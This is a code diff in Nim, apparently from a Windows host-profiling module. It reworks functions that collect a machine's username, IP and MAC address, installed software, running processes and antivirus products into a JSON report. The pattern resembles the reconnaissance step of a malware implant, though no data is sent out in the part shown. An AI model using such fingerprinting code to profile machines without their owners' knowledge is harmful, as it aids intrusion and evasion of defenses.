@@ -25,9 +25,12 @@ proc getOSInfo(): string =
   let arch = if getEnv("PROCESSOR_ARCHITECTURE") == "AMD64": "x64" else: "x86"
   result = "OS: " & version & " (Build " & build & ")\n"
   result &= "Architecture: " & arch & "\n"
-  result &= "Hostname: " & getEnv("COMPUTERNAME") & "\n"
-  result &= "Username: " & getEnv("USERNAME") & "\n"
-  result &= "Domain: " & getEnv("USERDOMAIN") & "\n"
+  # result &= "Hostname: " & getEnv("COMPUTERNAME") & "\n"
+  # result &= "Domain: " & getEnv("USERDOMAIN") & "\n"
+
+proc getUsername():string=
+  let username =  getEnv("USERNAME") 
+  return username
 
 proc getHardwareInfo(): string =
   var hKey: HKEY
@@ -53,16 +56,8 @@ proc getHardwareInfo(): string =
   result &= "RAM Available: " & $(memStatus.ullAvailPhys div (1024*1024*1024)) & " GB\n"
   result &= "Disks:\n" & disks
 
-proc getNetworkInfo(): string =
-  var localIP = ""
-  var hostname: array[256, char]
-  if gethostname(addr hostname[0], 256) == 0:
-    let he = gethostbyname(addr hostname[0])
-    if he != nil:
-      let addrList = cast[ptr ptr IN_ADDR](he.h_addr_list)
-      if addrList != nil and addrList[] != nil:
-        let inAddr: IN_ADDR = addrList[][]
-        localIP = $inet_ntoa(inAddr)
+proc getMacAddress(): string =
+
   var mac = ""
   var adapterInfo: array[16384, byte]
   var adapterSize = DWORD(len(adapterInfo))
@@ -75,8 +70,21 @@ proc getNetworkInfo(): string =
           if i < 5: mac &= ":"
         break
       adapter = adapter.Next
-  result = "Local IP: " & localIP & "\n"
-  result &= "MAC Address: " & mac & "\n"
+  result = mac
+
+
+proc getIpInfo():string=
+  var localIP = ""
+  var hostname: array[256, char]
+  if gethostname(addr hostname[0], 256) == 0:
+    let he = gethostbyname(addr hostname[0])
+    if he != nil:
+      let addrList = cast[ptr ptr IN_ADDR](he.h_addr_list)
+      if addrList != nil and addrList[] != nil:
+        let inAddr: IN_ADDR = addrList[][]
+        localIP = $inet_ntoa(inAddr)
+  result = localIP
+
 
 proc getInstalledSoftware(): string =
   let regPaths = [
@@ -135,8 +143,10 @@ proc getSystemInfo*(): JsonNode =
     "timestamp": getTime().format("yyyy-MM-dd HH:mm:ss"),
     "hostname": getEnv("COMPUTERNAME"),
     "os": getOSInfo(),
+    "user":getEnv("USERNAME"),
     "hardware": getHardwareInfo(),
-    "network": getNetworkInfo(),
+    "ip": getIpInfo(),
+    "Mac":getMacAddress(),
     "software": getInstalledSoftware(),
     "processes": getActiveProcesses(),
     "antivirus": getAntivirus()
